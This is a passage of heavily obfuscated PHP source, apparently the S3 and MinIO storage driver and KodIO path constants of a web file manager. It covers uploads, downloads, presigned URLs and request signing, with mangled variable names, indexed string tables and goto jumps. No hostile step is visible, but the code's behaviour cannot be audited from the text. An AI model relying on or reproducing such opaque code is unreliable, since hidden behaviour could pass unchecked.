(count($šâ†ÏÅ¸)) { $šâ†ÏÅ¸ = array_column($šâ†ÏÅ¸, $‹–ÀäÁ[32]); $Ğ–šöèî = array_merge($Ğ–šöèî, $šâ†ÏÅ¸); } if ($èÛ°Ûš === null) { break; } continue; } if ($·œã£“¸) { if (!empty($¸ÏåÍëÆ)) { if (count($¸ÏåÍëÆ) > 1 || isset($¸ÏåÍëÆ[0][$‹–ÀäÁ[32]]) && $¸ÏåÍëÆ[0][$‹–ÀäÁ[32]] != $«Á°ÄÏ“) { return !0; } } } else { if (!empty($šâ†ÏÅ¸)) { return !0; } } if ($èÛ°Ûš === null) { break; } } if ($îÍü€¢ ) { $€Æ¤Ó¯Ù = array_diff($€Æ¤Ó¯Ù, array($«Á°ÄÏ“)); $€Æ¤Ó¯Ù = count(array_unique($€Æ¤Ó¯Ù)); $Ğ–šöèî = count(array_unique($Ğ–šöèî)); return array($‹–ÀäÁ[240] => $€Æ¤Ó¯Ù, $‹–ÀäÁ[241] => $Ğ–šöèî); } return !1; } public function listAll($¡ÂªçÆ¤) { $Ìê–Û•Ò =& $_SERVER[öæÛ¿©¿]; $’ é¦Å× = $this->fileList($¡ÂªçÆ¤, $Ìê–Û•Ò[12], !0); $šÁØ‹Ìš = array_to_keyvalue($’ é¦Å×[$Ìê–Û•Ò[86]], $Ìê–Û•Ò[32]); foreach ($’ é¦Å×[$Ìê–Û•Ò[85]] as $ãÕÇ‹œô) { if (is_string($ãÕÇ‹œô)) { $šÁØ‹Ìš[$ãÕÇ‹œô] = array($Ìê–Û•Ò[79] => 0); } } return $this->listAllFiles($¡ÂªçÆ¤, $šÁØ‹Ìš); } public function canRead($·²óŠ¦°) { $‚Ú¨“§– =& $_SERVER[öæÛ¿©¿]; $…Ú”´ç = $this->client->getAccessControlPolicy($this->bucket, $·²óŠ¦°); if (!$…Ú”´ç) { return !1; } return in_array($…Ú”´ç, array($‚Ú¨“§–[242], $‚Ú¨“§–[243], $‚Ú¨“§–[244])) ? !0 : !1; } public function canWrite($Â«²Î£À) { $³„Î¨“¨ =& $_SERVER[öæÛ¿©¿]; $»å¡ŠÚ» = $this->client->getAccessControlPolicy($this->bucket, $Â«²Î£À); if (!$»å¡ŠÚ») { return !1; } return in_array($»å¡ŠÚ», array($³„Î¨“¨[242], $³„Î¨“¨[243])) ? !0 : !1; } public function getContent($¼õÒÆÊÊ) { return $this->client->getObject($this->bucket, $¼õÒÆÊÊ); } public function setContent($Ãô–Šƒ¥, $ï™¢Øğ = '', $€íó ¬’ = false) { $™¹ã›ÛÓ =& $_SERVER[öæÛ¿©¿]; $Ãô–Šƒ¥ = $€íó ¬’ ? trim($Ãô–Šƒ¥, $™¹ã›ÛÓ[8]) . $™¹ã›ÛÓ[8] : $Ãô–Šƒ¥; $öóø¾ê = get_file_mime(get_path_ext($Ãô–Šƒ¥)); $¿òå­¾Ğ = $this->client->putObject($ï™¢Øğ, $this->bucket, $Ãô–Šƒ¥, $™¹ã›ÛÓ[230], array(), $öóø¾ê); if (!$¿òå­¾Ğ) { return !1; } if ($€íó ¬’) { return !0; } return $¿òå­¾Ğ ? !0 : !1; } public function fileSubstr($é¶²ëÈš, $«ºæ¸‰², $Íí¥áºá) { $İ›²ó¶Ñ = $«ºæ¸‰² + $Íí¥áºá - 1; return $this->client->getObject($this->bucket, $é¶²ëÈš, array($_SERVER[öæÛ¿©¿][245] => "\x62\171\164\x65\163\x3d{$«ºæ¸‰²}\55{$İ›²ó¶Ñ}")); } public function upload($öüñíãå, $…ıÖäÄ†, $Ÿ»ƒìÜ™ = false, $ä…Î¾ÂÜ = REPEAT_REPLACE) { $éœşä¬ =& $_SERVER[öæÛ¿©¿]; if (!$…ıÖäÄ† || !@file_exists($…ıÖäÄ†)) { return !1; } $ÙİáÏË“ = array($éœşä¬[246] => @md5_file($…ıÖäÄ†)); $®Ü‘ãáƒ = array($éœşä¬[247] => get_file_mime(get_path_ext($öüñíãå))); if (IO::size($…ıÖäÄ†) <= 1024 * 1024 * 200) { $ë“ˆ¶ÈŒ = $this->client->putObjectFile($…ıÖäÄ†, $this->bucket, $öüñíãå, $éœşä¬[230], $ÙİáÏË“, $®Ü‘ãáƒ); return !empty($ë“ˆ¶ÈŒ) ? $this->getPathOuter($öüñíãå) : !1; } $”‡èĞ§¾ = $this->client->multiUploadObject($…ıÖäÄ†, $this->bucket, trim($öüñíãå, $éœşä¬[8]), $ÙİáÏË“, $®Ü‘ãáƒ); return $”‡èĞ§¾ ? $this->getPathOuter($öüñíãå) : !1; } public function download($ÈŞåå‰Õ, $£É¸ŠŠÙ) { if (!@is_dir($this->pathFather($£É¸ŠŠÙ)) && !IO::mkdir($this->pathFather($£É¸ŠŠÙ))) { return !1; } $ˆ¦ØûşÆ = $this->client->getObject($this->bucket, $ÈŞåå‰Õ, array(), $£É¸ŠŠÙ); return $ˆ¦ØûşÆ !== !1 ? $£É¸ŠŠÙ : !1; } public function link($é…†–¬Ù, $©Ô¤áÑ = array()) { return $this->getPreSignedURL($é…†–¬Ù, 3600 * 12, $©Ô¤áÑ); } private function getPreSignedURL($›½ÅßÂ, $ªÁı£ÉÈ, $ğñ‘¢ÁÈ = array(), $“÷ùùí = "\x47\x45\124") { $Î²»êø… =& $_SERVER[öæÛ¿©¿]; $›½ÅßÂ = trim($›½ÅßÂ, $Î²»êø…[8]); if ($this->signVer == $Î²»êø…[248]) { return $this->client->getPreSignedV2URL($this->bucket, $›½ÅßÂ, $ªÁı£ÉÈ, $“÷ùùí, $ğñ‘¢ÁÈ); } return $this->client->getPreSignedV4URL($this->bucket, $›½ÅßÂ, $ªÁı£ÉÈ, array(), $“÷ùùí, $ğñ‘¢ÁÈ); } public function fileOut($ÏÖìÁµ©, $óÎê…¹¨ = false, $´äî©ï = false, $Øé®ä ± = '') { $ş’ÌÙØ« =& $_SERVER[öæÛ¿©¿]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÏÖìÁµ©, $óÎê…¹¨, $´äî©ï, $Øé®ä ±); } if (!$´äî©ï) { $´äî©ï = $this->pathThis($ÏÖìÁµ©); } $èºæœÍØ = get_file_mime(get_path_ext($´äî©ï)); if ($èºæœÍØ == $ş’ÌÙØ«[249]) { return parent::fileOut($ÏÖìÁµ©, $óÎê…¹¨, $´äî©ï, $Øé®ä ±); } $˜ïœ¢¥Ô = array($ş’ÌÙØ«[250] => $èºæœÍØ); if ($óÎê…¹¨) { $˜ïœ¢¥Ô[$ş’ÌÙØ«[251]] = $ş’ÌÙØ«[252] . rawurlencode($´äî©ï); } else { } $ÏèâøşÔ = $this->link($ÏÖìÁµ©, $˜ïœ¢¥Ô); $this->fileOutLink($ÏèâøşÔ); } public function fileOutServer($ıçáÀ™Œ, $“ù¾şıÊ = false, $ÑÒéñú§ = false, $Í¿¼ñõÖ = '') { parent::fileOut($ıçáÀ™Œ, $“ù¾şıÊ, $ÑÒéñú§, $Í¿¼ñõÖ); } public function fileOutImageServer($Œƒ©ÂÖà, $„©ªœ— = 250) { parent::fileOutImage($Œƒ©ÂÖà, $„©ªœ—); } public function fileOutLink($ë²©„™Å) { $·Éúì€ =& $_SERVER[öæÛ¿©¿]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($·Éúì€[67], $·Éúì€[66], $·Éúì€[68])) && !get_url_scheme($this->endpoint) && substr($ë²©„™Å, 0, 7) == $·Éúì€[217]) { $ë²©„™Å = $·Éúì€[218] . substr($ë²©„™Å, 7); } header($·Éúì€[173] . $ë²©„™Å); die; } public function hashMd5($íÎõÏª¦, $˜ñöâŒ = '') { $Ä‘İìÂÏ = $this->objectMeta($íÎõÏª¦); if (!$Ä‘İìÂÏ) { return !1; } $˜ñöâŒ = $˜ñöâŒ ? $˜ñöâŒ : _get($Ä‘İìÂÏ, $_SERVER[öæÛ¿©¿][253]); return $˜ñöâŒ; } public function uploadFormData($ªÊÆ„¾Â, $òğ¼áî = 3600) { $Ğº¤äëˆ =& $_SERVER[öæÛ¿©¿]; if (!$this->_isClientAsync()) { $¸çØèŞÙ = $this->getPreSignedURL($ªÊÆ„¾Â, $òğ¼áî, array(), $Ğº¤äëˆ[254]); return array($Ğº¤äëˆ[207] => str_replace($Ğº¤äëˆ[217], $Ğº¤äëˆ[255], $¸çØèŞÙ)); } if (isset($GLOBALS[$Ğº¤äëˆ[6]][$Ğº¤äëˆ[92]][$Ğº¤äëˆ[256]]) && $GLOBALS[$Ğº¤äëˆ[6]][$Ğº¤äëˆ[92]][$Ğº¤äëˆ[256]] == $Ğº¤äëˆ[229]) { return $this->uploadMultiData($ªÊÆ„¾Â, $òğ¼áî); } if ($this->signVer == $Ğº¤äëˆ[248]) { return $this->uploadFormDataV2($ªÊÆ„¾Â, $òğ¼áî); } return $this->uploadFormDataV4($ªÊÆ„¾Â, $òğ¼áî); } public function uploadFormDataV2($öáÀ­Òı, $ë™éƒÕ = 3600) { $¥ø¹¬– =& $_SERVER[öæÛ¿©¿]; $ªòìñª = $this->pathFather($öáÀ­Òı); $ŠÅ„Ğ = $this->client->getHttpUploadPostParams($this->bucket, $ªòìñª, $¥ø¹¬–[230], $ë™éƒÕ); $‚áÕíóá = array_merge((array) $ŠÅ„Ğ, array($¥ø¹¬–[257] => $¥ø¹¬–[248], $¥ø¹¬–[207] => $this->getHost())); if ($this->_isClientAsync()) { unset($‚áÕíóá[$¥ø¹¬–[257]]); } return $‚áÕíóá; } public function uploadFormDataV4($¯”¹¬äÙ, $–»Ãª¿Ó = 3600) { $Œò˜¹¯Ä =& $_SERVER[öæÛ¿©¿]; $ÌƒƒÃÒª = $Œò˜¹¯Ä[230]; $ÄÅò‹ÀÀ = $Œò˜¹¯Ä[258]; $Èé¥¤Å = $Œò˜¹¯Ä[62]; $º¶³¶¢ = gmdate($Œò˜¹¯Ä[259]); $Í»®€èÂ = gmdate($Œò˜¹¯Ä[260]); $óÂÅùà¾ = $Œò˜¹¯Ä[261]; $Å³¼˜¤š = $–»Ãª¿Ó . $Œò˜¹¯Ä[12]; $ÔÂù‚ÁŠ = $Œò˜¹¯Ä[262]; $Õ÷«’à¤ = array($this->accessKey, $Í»®€èÂ, $this->region, $Èé¥¤Å, $óÂÅùà¾); $ãéŞïÙ³ = implode($Œò˜¹¯Ä[8], $Õ÷«’à¤); $—öĞ¹Šû = array($Œò˜¹¯Ä[263] => gmdate($Œò˜¹¯Ä[264], strtotime($Œò˜¹¯Ä[265])), $Œò˜¹¯Ä[266] => array(array($Œò˜¹¯Ä[267] => $this->bucket), array($Œò˜¹¯Ä[268], $Œò˜¹¯Ä[269], $Œò˜¹¯Ä[12]), array($Œò˜¹¯Ä[268], $Œò˜¹¯Ä[270], $Œò˜¹¯Ä[12]), array($Œò˜¹¯Ä[271] => $ÔÂù‚ÁŠ), array($Œò˜¹¯Ä[272] => $ãéŞïÙ³), array($Œò˜¹¯Ä[273] => $ÄÅò‹ÀÀ), array($Œò˜¹¯Ä[274] => $º¶³¶¢), array($Œò˜¹¯Ä[275] => $Å³¼˜¤š))); $è„„ß­ = base64_encode(json_encode($—öĞ¹Šû)); $ôîŸº¿ = hash_hmac($Œò˜¹¯Ä[276], $Í»®€èÂ, $Œò˜¹¯Ä[277] . $this->secret, !0); $ÜñÄ·ğ¯ = hash_hmac($Œò˜¹¯Ä[276], $this->region, $ôîŸº¿, !0); $‚½§¶‘ì = hash_hmac($Œò˜¹¯Ä[276], $Èé¥¤Å, $ÜñÄ·ğ¯, !0); $´à×ù = hash_hmac($Œò˜¹¯Ä[276], $óÂÅùà¾, $‚½§¶‘ì, !0); $’óÜéÒ¸ = hash_hmac($Œò˜¹¯Ä[276], $è„„ß­, $´à×ù); $ıçéÏóı = array($Œò˜¹¯Ä[247] => $Œò˜¹¯Ä[12], $Œò˜¹¯Ä[271] => $ÔÂù‚ÁŠ, $Œò˜¹¯Ä[278] => $è„„ß­, $Œò˜¹¯Ä[272] => $ãéŞïÙ³, $Œò˜¹¯Ä[273] => $ÄÅò‹ÀÀ, $Œò˜¹¯Ä[274] => $º¶³¶¢, $Œò˜¹¯Ä[275] => $Å³¼˜¤š, $Œò˜¹¯Ä[279] => $’óÜéÒ¸, $Œò˜¹¯Ä[257] => $Œò˜¹¯Ä[248], $Œò˜¹¯Ä[207] => $this->getHost()); if ($this->_isClientAsync()) { unset($ıçéÏóı[$Œò˜¹¯Ä[257]]); } return $ıçéÏóı; } public function uploadMultiData($—îôÕ•, $„·‰‰å = 3600) { $ÑØÌç­  =& $_SERVER[öæÛ¿©¿]; $‹Õó—„¿ = $this->signVer == $ÑØÌç­ [248] ? gmdate($ÑØÌç­ [280]) : gmdate($ÑØÌç­ [281]); $©÷ºÅÃı = array(); $Ò°©’ú = $this->client->getUploadId($this->bucket, $—îôÕ•, $©÷ºÅÃı); if (!$Ò°©’ú) { return !1; } $—ÏÀøŒá = array($ÑØÌç­ [282] => $Ò°©’ú, $ÑØÌç­ [207] => $this->getHost() . $ÑØÌç­ [8] . $this->pathEncode($—îôÕ•), $ÑØÌç­ [283] => $‹Õó—„¿, $ÑØÌç­ [95] => $—îôÕ•, $ÑØÌç­ [257] => $this->signVer); if ($this->_isClientAsync()) { unset($—ÏÀøŒá[$ÑØÌç­ [257]]); } return $—ÏÀøŒá; } public function uploadMultiAuth($òñ™ÖÙà, $ëÏ†â£Õ = array()) { $éÆäØœ˜ =& $_SERVER[öæÛ¿©¿]; if ($this->signVer == $éÆäØœ˜[248]) { if (isset($ëÏ†â£Õ[$éÆäØœ˜[284]])) { return $this->uploadPartAuthV2($òñ™ÖÙà, $ëÏ†â£Õ); } return $this->uploadListAuthV2($òñ™ÖÙà, $ëÏ†â£Õ); } if (isset($ëÏ†â£Õ[$éÆäØœ˜[284]])) { return $this->uploadPartAuthV4($òñ™ÖÙà, $ëÏ†â£Õ); } return $this->uploadListAuthV4($òñ™ÖÙà, $ëÏ†â£Õ); } public function uploadPartAuthV2($¨ş¡”Á, $Ÿ„¿¼¥› = array()) { $áŒüæ×š =& $_SERVER[öæÛ¿©¿]; $ößÆøğµ = $Ÿ„¿¼¥›[$áŒüæ×š[95]]; $åÏá«Ûô = gmdate($áŒüæ×š[280]); $²Ôà©ğÏ = array_intersect_key($Ÿ„¿¼¥›, array_flip(array($áŒüæ×š[284], $áŒüæ×š[282]))); ksort($²Ôà©ğÏ); $ÁŸ÷‚»­ = $²Ôà©ğÏ ? $áŒüæ×š[76] . http_build_query($²Ôà©ğÏ, null, $áŒüæ×š[285], PHP_QUERY_RFC3986) : $áŒüæ×š[12]; $•†âôşˆ = array($áŒüæ×š[254], $áŒüæ×š[12], $áŒüæ×š[121], $áŒüæ×š[12], "\x78\55\141\155\x7a\55\x64\141\164\145\x3a{$åÏá«Ûô}", $áŒüæ×š[8] . $this->bucket . $áŒüæ×š[8] . $this->pathEncode($ößÆøğµ) . $ÁŸ÷‚»­); $İĞõ›– = implode($áŒüæ×š[286], $•†âôşˆ); $İŞ¯£ìõ = $this->client->__getSignature($İĞõ›–); return array($áŒüæ×š[287] => $İŞ¯£ìõ, $áŒüæ×š[283] => $åÏá«Ûô); } public function uploadListAuthV2($èü¦àÌñ, $İ‡Ñ™‹Û = array()) { $šı¡›Ø· =& $_SERVER[öæÛ¿©¿]; $Œ˜Â›‹ = $İ‡Ñ™‹Û[$šı¡›Ø·[95]]; $†å‹ğÓ¸ = $İ‡Ñ™‹Û[$šı¡›Ø·[282]]; $˜‡º³Ò = $this->client->listParts($this->bucket, $Œ˜Â›‹, $†å‹ğÓ¸); if (!$˜‡º³Ò) { return !1; } $ïÔËÉ‡Ü = gmdate($šı¡›Ø·[280]); $…æï¾Æ« = $šı¡›Ø·[288] . $†å‹ğÓ¸; $Ÿ‰¬÷Â¤ = array($šı¡›Ø·[289], $šı¡›Ø·[12], $šı¡›Ø·[121], $šı¡›Ø·[12], "\x78\55\141\155\x7a\x2d\x64\141\164\145\x3a{$ïÔËÉ‡Ü}", $šı¡›Ø·[8] . $this->bucket . $šı¡›Ø·[8] . $this->pathEncode($Œ˜Â›‹) . $…æï¾Æ«); $¦¿ùª‹ = implode($šı¡›Ø·[286], $Ÿ‰¬÷Â¤); $ÌÁŸï¯´ = $this->client->__getSignature($¦¿ùª‹); return array($šı¡›Ø·[287] => $ÌÁŸï¯´, $šı¡›Ø·[283] => $ïÔËÉ‡Ü, $šı¡›Ø·[290] => $˜‡º³Ò); } public function uploadPartAuthV4($õùˆ©íå, $ÅÂîñ·¼ = array()) { $Ä¿ÊÃ‚ =& $_SERVER[öæÛ¿©¿]; $İŸİ½ßØ = $ÅÂîñ·¼[$Ä¿ÊÃ‚[95]]; $‘äòó§ = array($Ä¿ÊÃ‚[274] => gmdate($Ä¿ÊÃ‚[281]), $Ä¿ÊÃ‚[291] => _get($ÅÂîñ·¼, $Ä¿ÊÃ‚[292], hash($Ä¿ÊÃ‚[276], $Ä¿ÊÃ‚[12]))); $‘ôÅÇñæ = explode($Ä¿ÊÃ‚[209], $this->getHost()); $ë¡“¥òé = array($Ä¿ÊÃ‚[293] => $‘ôÅÇñæ[1], $Ä¿ÊÃ‚[294] => $Ä¿ÊÃ‚[12], $Ä¿ÊÃ‚[247] => $Ä¿ÊÃ‚[121], $Ä¿ÊÃ‚[295] => $ÅÂîñ·¼[$Ä¿ÊÃ‚[79]]); $£Â¨Ş¼ = $Ä¿ÊÃ‚[254]; $´Ú·Ë¯Ş = $Ä¿ÊÃ‚[8] . $this->pathEncode($İŸİ½ßØ); $ÓÔÅ™ëÂ = array_intersect_key($ÅÂîñ·¼, array_flip(array($Ä¿ÊÃ‚[284], $Ä¿ÊÃ‚[282]))); $÷óÁ®èº = $this->client->__getSignatureV4($‘äòó§, $ë¡“¥òé, $£Â¨Ş¼, $´Ú·Ë¯Ş, $ÓÔÅ™ëÂ); return array($Ä¿ÊÃ‚[287] => $÷óÁ®èº, $Ä¿ÊÃ‚[291] => $‘äòó§[$Ä¿ÊÃ‚[291]], $Ä¿ÊÃ‚[283] => $‘äòó§[$Ä¿ÊÃ‚[274]]); } public function uploadListAuthV4($Òµœ“Æœ, $Îû‹ı°¤ = array()) { $”èó­Ÿ =& $_SERVER[öæÛ¿©¿]; $’œŸ’©â = $Îû‹ı°¤[$”èó­Ÿ[95]]; $™”€÷®² = $Îû‹ı°¤[$”èó­Ÿ[282]]; $şª·®ÅŸ = $this->client->listParts($this->bucket, $’œŸ’©â, $™”€÷®²); if (!$şª·®ÅŸ) { return !1; } $˜âÕÅöê = $”èó­Ÿ[296]; foreach ($şª·®ÅŸ as $“—ÖËåƒ) { $˜âÕÅöê .= $”èó­Ÿ[297] . "\74\x50\x61\x72\x74\x4e\x75\155\142\145\162\76{$“—ÖËåƒ[$”èó­Ÿ[298]]}\74\x2f\x50\x61\162\x74\116\x75\x6d\142\145\162\x3e\xa" . "\x3c\x45\124\141\x67\76{$“—ÖËåƒ[$”èó­Ÿ[299]]}\x3c\x2f\105\124\x61\147\x3e\xa" . $”èó­Ÿ[300]; } $˜âÕÅöê .= $”èó­Ÿ[301]; $®Şí°Òî = array($”èó­Ÿ[274] => gmdate($”èó­Ÿ[281]), $”èó­Ÿ[291] => hash($”èó­Ÿ[276], $˜âÕÅöê)); $¯ŸùÏïÂ = explode($”èó­Ÿ[209], $this->getHost()); $¼œ•É£ñ = array($”èó­Ÿ[293] => $¯ŸùÏïÂ[1], $”èó­Ÿ[247] => $”èó­Ÿ[121], $”èó­Ÿ[295] => strlen($˜âÕÅöê)); $õ“õ‹­ = $”èó­Ÿ[289]; $Ä„šöœî = $”èó­Ÿ[8] . $this->pathEncode($’œŸ’©â); $²º„°é¯ = array($”èó­Ÿ[282] => $™”€÷®²); $âù½¹å = $this->client->__getSignatureV4($®Şí°Òî, $¼œ•É£ñ, $õ“õ‹­, $Ä„šöœî, $²º„°é¯); return array($”èó­Ÿ[287] => $âù½¹å, $”èó­Ÿ[291] => $®Şí°Òî[$”èó­Ÿ[291]], $”èó­Ÿ[283] => $®Şí°Òî[$”èó­Ÿ[274]], $”èó­Ÿ[290] => $şª·®ÅŸ); } private function _isClientAsync() { $”‡÷»™ =& $_SERVER[öæÛ¿©¿]; static $Ÿ£Ú×õõ = null; if ($Ÿ£Ú×õõ === null) { $İ×Š…¹ = isset($_REQUEST[$”‡÷»™[302]]) ? json_decode($_REQUEST[$”‡÷»™[302]], !0) : !1; $Ÿ£Ú×õõ = $İ×Š…¹ && _get($İ×Š…¹, $”‡÷»™[303]) == $”‡÷»™[304]; } return $Ÿ£Ú×õõ; } public function getHost() { $¥¬ñŠıÆ =& $_SERVER[öæÛ¿©¿]; $­€ˆ±œĞ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($¥¬ñŠıÆ[70], $¥¬ñŠıÆ[64], $¥¬ñŠıÆ[69], $¥¬ñŠıÆ[62]))) { return $­€ˆ±œĞ . $¥¬ñŠıÆ[8] . $this->bucket; } if ($this->osType == $¥¬ñŠıÆ[62] && !is_domain($­€ˆ±œĞ)) { return $­€ˆ±œĞ . $¥¬ñŠıÆ[8] . $this->bucket; } $­€ˆ±œĞ = explode($¥¬ñŠıÆ[209], $­€ˆ±œĞ); return $­€ˆ±œĞ[0] . $¥¬ñŠıÆ[209] . $this->bucket . $¥¬ñŠıÆ[10] . $­€ˆ±œĞ[1]; } public function size($ôê¯™ë¥) { $¼œ›ò’ = $this->objectMeta($ôê¯™ë¥); return $¼œ›ò’ ? $¼œ›ò’[$_SERVER[öæÛ¿©¿][79]] : 0; } public function info($Óİòä) { if ($this->isFolder($Óİòä)) { return $this->folderInfo($Óİòä); } else { if ($this->isFile($Óİòä)) { return $this->fileInfo($Óİòä); } } return !1; } public function exist($Û¿ğò¸) { return $this->isFile($Û¿ğò¸) || $this->isFolder($Û¿ğò¸); } public function isFile($’à£›àæ) { return !$this->isFolder($’à£›àæ) && $this->objectMeta($’à£›àæ); } public function isFolder($ÌÒ‘Û­Ô) { return $this->cacheMethod($_SERVER[öæÛ¿©¿][178], $ÌÒ‘Û­Ô); } protected function objectMeta($å’èİú÷) { return $this->cacheMethod($_SERVER[öæÛ¿©¿][180], $å’èİú÷); } protected function _objectMeta($ÕÍÂŠØğ) { $—ˆºÈœÃ =& $_SERVER[öæÛ¿©¿]; $ÕÍÂŠØğ = rtrim($ÕÍÂŠØğ, $—ˆºÈœÃ[8]); try { $ı–„¬ê = $this->client->getObjectInfo($this->bucket, $ÕÍÂŠØğ); if (!isset($ı–„¬ê[$—ˆºÈœÃ[253]]) && isset($ı–„¬ê[$—ˆºÈœÃ[305]])) { $ı–„¬ê[$—ˆºÈœÃ[253]] = $ı–„¬ê[$—ˆºÈœÃ[305]]; } } catch (Exception $€Úİå¨Î) { $ı–„¬ê = !1; } if (!$ı–„¬ê) { } return $ı–„¬ê; } protected function _isFolder($Ë»ªô»ı) { $ÈŠòãÚ‚ =& $_SERVER[öæÛ¿©¿]; $Ë»ªô»ı = rtrim($Ë»ªô»ı, $ÈŠòãÚ‚[8]) . $ÈŠòãÚ‚[8]; if ($Ë»ªô»ı == $ÈŠòãÚ‚[12] || $Ë»ªô»ı == $ÈŠòãÚ‚[8]) { return !0; } $³…¶û’‚ = $this->client->getBucket($this->bucket, $Ë»ªô»ı, null, 1); if (empty($³…¶û’‚[$ÈŠòãÚ‚[237]])) { return !1; } $ÚÃä£Â = $³…¶û’‚[$ÈŠòãÚ‚[237]][0][$ÈŠòãÚ‚[32]]; return stripos($ÚÃä£Â, $Ë»ªô»ı) === 0 ? !0 : !1; if (substr($ÚÃä£Â, -1) == $ÈŠòãÚ‚[8]) { return !0; } if (get_path_this($ÚÃä£Â) == get_path_this($Ë»ªô»ı)) { return !1; } return !0; } public function listObject($”àõ„ ¯) { return $this->fileList($”àõ„ ¯, $_SERVER[öæÛ¿©¿][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Ë„«Ä€) { $†ëÇ† =& $_SERVER[öæÛ¿©¿]; parent::__construct($Ë„«Ä€); $this->setSignVersion($†ëÇ†[248]); if (!$this->region) { $this->region = $†ëÇ†[306]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $…é±¸°Ï = $this->getBktRegion(); return $this->region == $…é±¸°Ï ? !0 : !1; } public function uploadFormData($µì„ƒ™û, $ï¡È’šô = 3600) { $©µ‰©Š =& $_SERVER[öæÛ¿©¿]; $¹ÃÔÊ = $©µ‰©Š[230]; $ã©ø«‡ = $©µ‰©Š[258]; $½ƒè½Å· = $©µ‰©Š[62]; $î½Ò‰è¬ = gmdate($©µ‰©Š[259]); $ìÀò×«Ê = gmdate($©µ‰©Š[260]); $¾úúİñ™ = $©µ‰©Š[261]; $¤Éãš¯… = $ï¡È’šô . $©µ‰©Š[12]; $ßÀñòé = $©µ‰©Š[262]; $¾Ì‹ê©Ò = array($this->accessKey, $ìÀò×«Ê, $this->region, $½ƒè½Å·, $¾úúİñ™); $ç£é¼¸ = implode($©µ‰©Š[8], $¾Ì‹ê©Ò); $Ñ•Ô£Œõ = array($©µ‰©Š[263] => gmdate($©µ‰©Š[264], strtotime($©µ‰©Š[265])), $©µ‰©Š[266] => array(array($©µ‰©Š[267] => $this->bucket), array($©µ‰©Š[307] => $¹ÃÔÊ), array($©µ‰©Š[268], $©µ‰©Š[269], $©µ‰©Š[12]), array($©µ‰©Š[268], $©µ‰©Š[270], $©µ‰©Š[12]), array($©µ‰©Š[268], $©µ‰©Š[308], $©µ‰©Š[12]), array($©µ‰©Š[271] => $ßÀñòé), array($©µ‰©Š[272] => $ç£é¼¸), array($©µ‰©Š[273] => $ã©ø«‡), array($©µ‰©Š[274] => $î½Ò‰è¬), array($©µ‰©Š[275] => $¤Éãš¯…))); $˜¶£‚äó = base64_encode(json_encode($Ñ•Ô£Œõ)); $œîˆšù = hash_hmac($©µ‰©Š[276], $ìÀò×«Ê, $©µ‰©Š[277] . $this->secret, !0); $Æİ½Ç¦ = hash_hmac($©µ‰©Š[276], $this->region, $œîˆšù, !0); $È†¢Î¿Ö = hash_hmac($©µ‰©Š[276], $½ƒè½Å·, $Æİ½Ç¦, !0); $ìæ²ÌÆé = hash_hmac($©µ‰©Š[276], $¾úúİñ™, $È†¢Î¿Ö, !0); $İ™İ«ûê = hash_hmac($©µ‰©Š[276], $˜¶£‚äó, $ìæ²ÌÆé); $ºûü“Ãû = array($©µ‰©Š[247] => $©µ‰©Š[12], $©µ‰©Š[295] => $©µ‰©Š[12], $©µ‰©Š[307] => $¹ÃÔÊ, $©µ‰©Š[271] => $ßÀñòé, $©µ‰©Š[278] => $˜¶£‚äó, $©µ‰©Š[309] => $ç£é¼¸, $©µ‰©Š[310] => $ã©ø«‡, $©µ‰©Š[311] => $î½Ò‰è¬, $©µ‰©Š[312] => $¤Éãš¯…, $©µ‰©Š[313] => $İ™İ«ûê, $©µ‰©Š[207] => $this->getHost()); return $ºûü“Ãû; } } goto Cè İçõ¯; aùÒÙîòË÷: class KodIO { const KOD_SOURCE = "\173\163\x6f\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\173\165\x73\145\x72\122\x65\x63\x79\143\154\x65\175"; const KOD_USER_FAV = "\173\165\x73\x65\162\106\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\162\x46\x69\154\x65\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\x46\151\154\145\124\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\165\x70\x52\x6f\157\164\123\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\123\x68\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\162\123\150\x61\162\145\114\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\162\x65\124\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\x61\162\145\111\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\163\x68\141\x72\145\x49\164\x65\x6d\114\151\156\x6b\x7d"; const KOD_SHARE_OUTER = "\173\x73\x68\x61\x72\x65\x49\164\x65\155\117\165\164\175"; const KOD_SEARCH = "\173\x73\145\x61\162\x63\x68\175"; const KOD_BLOCK = "\x7b\142\x6c\x6f\x63\153\175"; const KOD_IO = "\173\x69\157\175"; const KOD_USER_RECENT = "\173\165\163\x65\162\122\x65\156\143\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\x76\145\x72\175"; public static function typeList() { $ØÒÙ¿çÂ =& $_SERVER[öæÛ¿©¿]; return array($ØÒÙ¿çÂ[1384] => self::KOD_SOURCE, $ØÒÙ¿çÂ[1385] => self::KOD_USER_RECYCLE, $ØÒÙ¿çÂ[1386] => self::KOD_USER_FAV, $ØÒÙ¿çÂ[1387] => self::KOD_USER_FILE_TAG, $ØÒÙ¿çÂ[1388] => self::KOD_USER_FILE_TYPE, $ØÒÙ¿çÂ[1389] => self::KOD_GROUP_ROOT_SELF, $ØÒÙ¿çÂ[1390] => self::KOD_USER_SHARE, $ØÒÙ¿çÂ[1391] => self::KOD_USER_SHARE_LINK, $ØÒÙ¿çÂ[1392] => self::KOD_USER_SHARE_TO_ME, $ØÒÙ¿çÂ[1393] => self::KOD_SHARE_ITEM, $ØÒÙ¿çÂ[1394] => self::KOD_SHARE_LINK, $ØÒÙ¿çÂ[1395] => self::KOD_SHARE_OUTER, $ØÒÙ¿çÂ[1396] => self::KOD_SEARCH, $ØÒÙ¿çÂ[1397] => self::KOD_BLOCK, $ØÒÙ¿çÂ[1398] => 